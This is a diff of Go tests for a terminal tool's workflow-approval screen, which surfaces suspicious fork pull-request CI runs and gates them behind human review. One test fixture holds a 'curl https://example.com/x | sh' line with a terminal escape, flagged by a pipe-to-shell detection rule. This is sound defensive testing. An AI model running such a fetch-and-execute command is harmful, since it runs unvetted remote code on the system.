@@ -51,7 +51,7 @@ func baselineRoot(t *testing.T) string {
 	if err != nil {
 		t.Fatal(err)
 	}
-	files := append(modules, filepath.Join("..", "bin", "apply"), filepath.Join("..", "bin", "briefs"), filepath.Join("..", "bin", "taxonomy-settings"), filepath.Join("..", "bin", "item-labels"), filepath.Join("..", "bin", "action-policy"), filepath.Join("..", "bin", "verification-settings"), filepath.Join("..", "bin", "ci-policy"), filepath.Join("..", "bin", "pr-size"), filepath.Join("..", "bin", "action-proposals"), filepath.Join("..", "bin", "review-request"), filepath.Join("..", "bin", "pr-checks"), filepath.Join("..", "bin", "not-duplicate"))
+	files := append(modules, filepath.Join("..", "bin", "apply"), filepath.Join("..", "bin", "briefs"), filepath.Join("..", "bin", "taxonomy-settings"), filepath.Join("..", "bin", "item-labels"), filepath.Join("..", "bin", "action-policy"), filepath.Join("..", "bin", "verification-settings"), filepath.Join("..", "bin", "ci-policy"), filepath.Join("..", "bin", "pr-size"), filepath.Join("..", "bin", "action-proposals"), filepath.Join("..", "bin", "review-request"), filepath.Join("..", "bin", "pr-checks"), filepath.Join("..", "bin", "not-duplicate"), filepath.Join("..", "bin", "workflow-runs"))
 	for _, source := range files {
 		data, err := os.ReadFile(source)
 		if err != nil {
@@ -1067,6 +1067,22 @@ func TestBaselineSettingsGuidanceUsesScriptAndGuardsReplies(t *testing.T) {
 	if !m.settings.automations.labelingEnabled || m.settings.automations.actions[0].Mode != "execute" {
 		t.Fatal("stale Automations response changed the selected repository's setting")
 	}
+
+	// Workflow approval is the last card, defaults OFF and cycles through Stage and Execute normal runs for this repository only.
+	m = baselineSend(m, tea.KeyPressMsg{Code: 'G', Text: "G"})
+	if m.automationCard().kind != "workflow" || m.settings.automations.workflow.Mode != "off" || !strings.Contains(ansi.Strip(m.automationsView()), "Workflow approval") {
+		t.Fatal("Workflow approval did not appear last and OFF")
+	}
+	for _, want := range []string{"stage", "execute", "off"} {
+		next, cmd = m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
+		m = baselineSend(next.(model), cmd().(automationMsg))
+		if m.settings.automations.workflow.Mode != want {
+			t.Fatalf("Workflow approval did not move to %s: %s", want, m.settings.automations.workflow.Mode)
+		}
+	}
+	if prompt := m.workflowApprovalPrompt(); !strings.Contains(prompt, "prompts/workflow-approval.md") || !strings.Contains(prompt, m.repo) {
+		t.Fatal("Workflow approval prompt lacked its playbook or repository")
+	}
 }
 
 func TestBaselineScriptsUseSelectedInstall(t *testing.T) {
@@ -1402,12 +1418,13 @@ print(json.dumps(value))
 	if cmd := m.checksIfNeeded(); cmd != nil {
 		t.Fatal("empty CI automatically repeated an observation")
 	}
-	// Focused refresh is available even when there is no Checks tab.
-	next, cmd = m.Update(tea.KeyPressMsg{Code: 'r', Mod: tea.ModCtrl})
+	// Checks refresh only from their own tab, so a PR without one has no refresh key.
+	next, _ = m.Update(tea.KeyPressMsg{Code: 'r', Mod: tea.ModCtrl})
 	m = next.(model)
-	if cmd == nil || !m.checks.busy || m.refreshing {
-		t.Fatalf("hidden Checks could not request focused CI: cmd=%v busy=%v refreshing=%v scope=%v focus=%v field=%v loading=%v error=%v", cmd != nil, m.checks.busy, m.refreshing, m.prChecksKeyScope(), m.focus, m.form.focused, m.detail.loading, m.lastError.open)
+	if m.checks.busy {
+		t.Fatal("Ctrl-R still requested focused CI")
 	}
+	cmd = m.readChecks("refresh", 0)
 	missing = cmd().(checksMsg)
 	if missing.err != nil || missing.data.Mode != "refresh" {
 		t.Fatal("focused refresh did not request bounded metadata acquisition")
@@ -1485,6 +1502,178 @@ print(json.dumps(value))
 	if strings.Contains(rendered, logText) {
 		t.Fatal("Checks embedded the retained log instead of its reader hint")
 	}
+
+	// A fork PR's runs waiting for approval are grouped above failures, as pending rather than failed.
+	awaiting := failure
+	awaiting.Rows = append([]checkRow{}, failure.Rows...)
+	awaiting.Rows[0].Result, awaiting.Rows[0].Conclusion, awaiting.Rows[0].Name, awaiting.Rows[0].FailureLog = "pending", "action_required", "Fork build", nil
+	awaiting.Rows[0].Problems = []string{"action required: waiting for someone to act, such as a maintainer approving workflow runs for a fork PR; not a failure"}
+	awaiting.Rows[1].Result, awaiting.Rows[1].Conclusion = "failed", "failure"
+	awaiting.ResultCounts.Pending, awaiting.ResultCounts.Failed, awaiting.ResultCounts.Passed = 1, 1, 18
+	if err := validateChecksPage(awaiting, m.repo, 3, "offline", "", 0); err != nil {
+		t.Fatal(err)
+	}
+	awaitingText := renderChecks(awaiting)
+	group, failed := strings.Index(awaitingText, "Awaiting approval (1)"), strings.Index(awaitingText, "\nFailed")
+	if group < 0 || failed < group || !strings.Contains(awaitingText[group:failed], "Fork build") || strings.Contains(awaitingText, "Fork build · pending") || strings.Contains(awaitingText, "action required:") {
+		t.Fatalf("Checks did not group awaiting-approval runs once above failures:\n%s", awaitingText)
+	}
+
+	// W lists those runs for a current item, then shows the offline assessment: flags and the diff hunks behind them, read-only.
+	assessment := workflowAssessment{Repository: m.repo, Number: 3, Snapshot: "listed-pin", Head: strings.Repeat("b", 40), Checksum: "sum"}
+	assessment.Counts.Suspicious = 1
+	assessment.PRFlags = []workflowFlag{{Category: "risky-pattern", Rule: "pipe-to-shell", Detail: "added lines match pipe-to-shell", Count: 1}}
+	assessment.PRFlags[0].Locations = append(assessment.PRFlags[0].Locations, struct {
+		Path string `json:"path"`
+		Line int    `json:"line"`
+	}{"scripts/test.sh", 1})
+	assessment.Runs = []workflowRun{{ID: 7, Name: "Fork build", Path: ".github/workflows/ci.yml", Event: "pull_request", HeadSHA: assessment.Head, HeadRepository: "fork/repo", State: "suspicious"}}
+	assessment.Hunks = []workflowHunk{{Path: "scripts/test.sh", Header: "@@ -1 +1 @@", Start: 1, End: 1, Text: "-echo ok\n+curl https://example.com/x | sh\x1b[2J", Rules: []string{"pipe-to-shell"}, Lines: []int{1}}}
+	writeWorkflowFixture := func(name string, value any) {
+		data, err := json.Marshal(value)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(filepath.Join(m.installRoot, name), data, 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	writeWorkflowFixture("workflow-list.json", workflowListing{Repository: m.repo, Number: 3, Snapshot: "listed-pin"})
+	writeWorkflowFixture("workflow-assess.json", assessment)
+	workflowScript := `#!/usr/bin/env python3
+import pathlib, sys
+root = pathlib.Path(__file__).parent.parent
+with open(root / "workflow-args.log", "a") as log:
+    log.write(" ".join(sys.argv[1:]) + "\n")
+print((root / f"workflow-{sys.argv[1]}{'-publish' if '--publish' in sys.argv else ''}.json").read_text())
+`
+	if err := os.WriteFile(filepath.Join(m.installRoot, "bin", "workflow-runs"), []byte(workflowScript), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	approvalModel := baselineModel(t, m.installRoot)
+	approvalModel.width, approvalModel.height = 100, 35
+	approvalModel.detail.SetItem(Item{Kind: "pr", Number: 3})
+	approvalModel.detail.loading = false
+	approvalModel.detail.Resize(80, 20)
+	approvalModel.focus = FocusDetail
+	approvalModel.form.FocusField(fieldContent)
+	approvalModel.checks = checksUI{loaded: true, snapshot: awaiting.Snapshot, page: awaiting}
+	approvalModel.checksPageText(awaiting)
+	approvalModel.detail.JumpSection(2)
+	if !strings.Contains(fmt.Sprint(approvalModel.footerGroups()), "workflow approval") {
+		t.Fatal("Checks omitted the workflow approval shortcut")
+	}
+	approvalNext, approvalCmd := approvalModel.Update(tea.KeyPressMsg{Code: 'W', Text: "W"})
+	approvalModel = approvalNext.(model)
+	if approvalCmd == nil || approvalModel.checks.approval == nil || !approvalModel.checks.approval.busy {
+		t.Fatal("W did not open the workflow approval window")
+	}
+	approvalReply := approvalCmd().(workflowRunsMsg)
+	if approvalReply.err != nil {
+		t.Fatal(approvalReply.err)
+	}
+	approvalModel = baselineSend(approvalModel, approvalReply)
+	approvalModel.checks.approval.viewport.SetHeight(200)
+	approvalContent := ansi.Strip(approvalModel.checks.approval.viewport.View())
+	for _, want := range []string{"1 suspicious", "Flags on this PR (1)", "pipe-to-shell", "scripts/test.sh:1", "Runs awaiting approval (1)", "Fork build: suspicious", "Workflow .github/workflows/ci.yml, on pull_request", "Run 7 for head bbbbbbbbbbbb from fork/repo", "pipe-to-shell: added lines match", "Suspicious because of the flags on this PR, below.", "Flagged changes (1)", "scripts/test.sh · lines 1–1", "+curl https://example.com/x | sh"} {
+		if !strings.Contains(approvalContent, want) {
+			t.Fatalf("workflow approval window omitted %q:\n%s", want, approvalContent)
+		}
+	}
+	if strings.Contains(approvalModel.checks.approval.viewport.View(), "\x1b[2J") || len(approvalModel.checks.approval.hunks) != 1 {
+		t.Fatal("workflow approval window rendered source escapes or lost its hunk positions")
+	}
+	calls, err := os.ReadFile(filepath.Join(m.installRoot, "workflow-args.log"))
+	if err != nil || !strings.Contains(string(calls), "list --acquire") || !strings.Contains(string(calls), "assess --include-hunks") || strings.Contains(string(calls), "approve") {
+		t.Fatalf("workflow approval window did not list then assess: %s", calls)
+	}
+
+	// Approving suspicious runs needs every flagged hunk scrolled into view, then two presses: a dry run bound to the shown checksum, then its exact publish.
+	approvalPlan := workflowApprovalPlan{Approval: "hash"}
+	approvalPlan.Plan.RequestID, approvalPlan.Plan.Repository, approvalPlan.Plan.Number, approvalPlan.Plan.Head, approvalPlan.Plan.Checksum = "req", m.repo, 3, assessment.Head, "sum"
+	approvalPlan.Plan.Runs = append(approvalPlan.Plan.Runs, struct {
+		ID    int64  `json:"id"`
+		State string `json:"state"`
+	}{7, "suspicious"})
+	writeWorkflowFixture("workflow-approve.json", approvalPlan)
+	writeWorkflowFixture("workflow-approve-publish.json", workflowApprovalResult{Repository: m.repo, Number: 3, RequestID: "req", Results: []workflowOutcome{{RunID: 7, Status: "approved", By: "tester"}}})
+	writeWorkflowFixture("workflow-hold.json", map[string]int{"requests": 0})
+	approvalReader := approvalModel.checks.approval
+	approvalReader.viewport.SetHeight(3)
+	approvalReader.viewport.GotoTop()
+	approvalReader.read, approvalReader.progress = []bool{false}, append([]int(nil), approvalReader.hunks...)
+	approvalModel = baselineSend(approvalModel, tea.KeyPressMsg{Code: 'a', Text: "a"})
+	if !strings.Contains(approvalModel.status, "Read every flagged change first") || approvalReader.writing != "" {
+		t.Fatalf("approval was offered before the flagged hunk was read: %q", approvalModel.status)
+	}
+	approvalModel = baselineSend(approvalModel, tea.KeyPressMsg{Code: 'n', Text: "n"})
+	if approvalReader.unread() != 1 {
+		t.Fatal("a hunk taller than the window counted as read from its first lines")
+	}
+	approvalModel = baselineSend(approvalModel, tea.KeyPressMsg{Code: 'G', Text: "G"})
+	if approvalReader.unread() != 0 || !strings.Contains(ansi.Strip(approvalModel.workflowStatusLine(200)), "Every flagged hunk has been read.") {
+		t.Fatal("scrolling the flagged hunk into view did not count it as read")
+	}
+	approvalNext, approvalCmd = approvalModel.Update(tea.KeyPressMsg{Code: 'a', Text: "a"})
+	approvalModel = baselineSend(approvalNext.(model), approvalCmd())
+	if approvalReader.confirm == nil || !strings.Contains(ansi.Strip(approvalModel.workflowStatusLine(200)), "Ready to approve runs 7 at head bbbbbbbbbbbb (1 suspicious)") || !strings.Contains(fmt.Sprint(approvalModel.footerGroups()), "approve these runs") {
+		t.Fatalf("the first a did not show the exact runs and head: %q", ansi.Strip(approvalModel.workflowStatusLine(200)))
+	}
+	approvalModel = baselineSend(approvalModel, tea.KeyPressMsg{Code: 'j', Text: "j"})
+	if approvalReader.confirm != nil {
+		t.Fatal("another key did not cancel the pending approval")
+	}
+	approvalNext, approvalCmd = approvalModel.Update(tea.KeyPressMsg{Code: 'a', Text: "a"})
+	approvalModel = baselineSend(approvalNext.(model), approvalCmd())
+	approvalNext, approvalCmd = approvalModel.Update(tea.KeyPressMsg{Code: 'a', Text: "a"})
+	approvalModel = approvalNext.(model)
+	approvalNext, approvalCmd = approvalModel.Update(approvalCmd())
+	approvalModel = approvalNext.(model)
+	calls, _ = os.ReadFile(filepath.Join(m.installRoot, "workflow-args.log"))
+	if !strings.Contains(approvalModel.status, "1 approved") || approvalCmd == nil || !strings.Contains(string(calls), "--run 7 --by tester --publish --request-id req --approve hash") {
+		t.Fatalf("the second a did not publish the exact previewed plan and list again: %q\n%s", approvalModel.status, calls)
+	}
+	approvalModel = baselineSend(approvalModel, approvalCmd())
+
+	// d holds every listed run locally with an optional reason, bound to the shown head.
+	approvalModel = baselineSend(approvalModel, tea.KeyPressMsg{Code: 'd', Text: "d"})
+	if approvalModel.checks.approval.reason == nil {
+		t.Fatal("d did not open the hold reason")
+	}
+	approvalModel = baselineSend(approvalModel, tea.KeyPressMsg{Code: 'x', Text: "x"})
+	approvalNext, approvalCmd = approvalModel.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
+	approvalModel = approvalNext.(model)
+	approvalNext, approvalCmd = approvalModel.Update(approvalCmd())
+	approvalModel = approvalNext.(model)
+	calls, _ = os.ReadFile(filepath.Join(m.installRoot, "workflow-args.log"))
+	if !strings.Contains(approvalModel.status, "Held 1 run(s) on PR #3") || !strings.Contains(string(calls), "--run 7 --head "+assessment.Head+" --by tester --reason x") {
+		t.Fatalf("d did not save a hold for the shown head: %q\n%s", approvalModel.status, calls)
+	}
+	approvalModel = baselineSend(approvalModel, approvalCmd())
+
+	// A reply for a closed window is dropped, and a pinned packet only assesses the listing bound to its own snapshot.
+	approvalNext, approvalCmd = approvalModel.Update(tea.KeyPressMsg{Code: 'r', Text: "r"})
+	approvalModel = approvalNext.(model)
+	staleApproval := approvalCmd().(workflowRunsMsg)
+	approvalModel = baselineSend(approvalModel, tea.KeyPressMsg{Code: tea.KeyEsc})
+	if approvalModel.checks.approval != nil {
+		t.Fatal("Esc did not close the workflow approval window")
+	}
+	approvalModel = baselineSend(approvalModel, staleApproval)
+	if approvalModel.checks.approval != nil {
+		t.Fatal("a stale workflow run reply reopened the window")
+	}
+	if err := os.Remove(filepath.Join(m.installRoot, "workflow-args.log")); err != nil {
+		t.Fatal(err)
+	}
+	approvalModel.detail.enriched.Evidence = &batchEvidence{SnapshotID: "packet-pin"}
+	approvalNext, approvalCmd = approvalModel.Update(tea.KeyPressMsg{Code: 'W', Text: "W"})
+	approvalModel = baselineSend(approvalNext.(model), approvalCmd())
+	calls, _ = os.ReadFile(filepath.Join(m.installRoot, "workflow-args.log"))
+	if strings.Contains(string(calls), "list") || !strings.Contains(approvalModel.checks.approval.problem, "another snapshot") {
+		t.Fatalf("a pinned packet listed runs live or accepted another snapshot's listing: %s / %q", calls, approvalModel.checks.approval.problem)
+	}
+	approvalModel.detail.enriched.Evidence = nil
 	view := renderChecksView(failure, 80)
 	for _, colored := range []struct{ text, role string }{{"1", currentTheme.Error}, {"Failed", currentTheme.Error}, {"0", currentTheme.Warning}, {"19", currentTheme.Success}, {"1", currentTheme.Muted}, {"unknown", currentTheme.Muted}, {"incomplete", currentTheme.Warning}, {"recently", currentTheme.Success}} {
 		expected := lipgloss.NewStyle().Foreground(lipgloss.Color(colored.role)).Render(colored.text)
@@ -1893,9 +2082,8 @@ print((root / "log-fixture.json").read_text())
 	}
 
 	before := m.detail.sections[m.detail.active].source
-	next, refresh, handled := m.handleChecksKey(tea.KeyPressMsg{Code: 'r', Mod: tea.ModCtrl})
-	m = next.(model)
-	if !handled || refresh != nil || m.detail.sections[m.detail.active].source != before {
+	refresh := m.readChecks("refresh", 0)
+	if refresh != nil || m.detail.sections[m.detail.active].source != before || !strings.Contains(m.status, "pinned") {
 		t.Fatal("fixed checks refresh changed source or started acquisition")
 	}
 	m.checks.snapshot = "fixed-packet"
@@ -2113,6 +2301,40 @@ func TestBaselineSavingSuggestedDuplicateFormReturnsToPairs(t *testing.T) {
 				t.Fatal("saved duplicate pair remained visible")
 			}
 		})
+	}
+}
+
+func TestBaselineWorkflowNotificationsOpenCurrentChecks(t *testing.T) {
+	m := baselineModel(t, baselineRoot(t))
+	// An install with nothing listed yet still loads Notifications: the real inbox answers offline with no rows.
+	if inbox, err := readWorkflowInbox(&readProcess{}, m.installRoot, m.repo); err != nil || len(inbox.Rows) != 0 {
+		t.Fatalf("an empty install's workflow inbox failed or listed rows: %v %+v", err, inbox)
+	}
+
+	m.width, m.height = 160, 40
+	m.items = append(m.items, Item{Kind: "pr", Number: 5, State: "open", Title: "Fork change", URL: "https://github.com/owner/repo/pull/5"})
+	m.notifications = notificationsUI{open: true, ticked: map[int]bool{}, tracked: &trackedPage{}, attention: &attentionPage{}, closures: &actionHistoryPage{}}
+	m.notificationsLifecycle = &readLifecycle{}
+	if err := json.Unmarshal([]byte(`{"repository":"owner/repo","rows":[{"number":5,"title":"Fork change","waiting":[{"id":7,"name":"CI"}],"suspicious":1,"staged":[{}],"notes":[],"outcomes":[{"run_id":7,"status":"unknown"}],"uncertain":1}],"pagination":{"total":1},"requests":0}`), &m.notifications.workflows); err != nil {
+		t.Fatal(err)
+	}
+	view := ansi.Strip(m.notificationsView())
+	for _, want := range []string{"Workflows", "PR #5 Fork change", "1 run(s) waiting", "1 suspicious staged for a person", "last outcome uncertain", "Uncertain"} {
+		if !strings.Contains(view, want) {
+			t.Fatalf("Workflows section omitted %q:\n%s", want, view)
+		}
+	}
+
+	// Enter opens the PR as a current item and asks for its Checks tab; it approves nothing.
+	for i, choice := range m.notifications.choices() {
+		if choice.kind == "workflow" {
+			m.notifications.selected = i
+		}
+	}
+	next, _ := m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
+	m = next.(model)
+	if m.notifications.open || m.notificationPR.open || m.detail.key != (Key{Kind: "pr", Number: 5}) || m.checksOnLoad != m.detail.key || m.focus != FocusDetail {
+		t.Fatal("a Workflows row did not open its PR as a current item headed for Checks")
 	}
 }
 
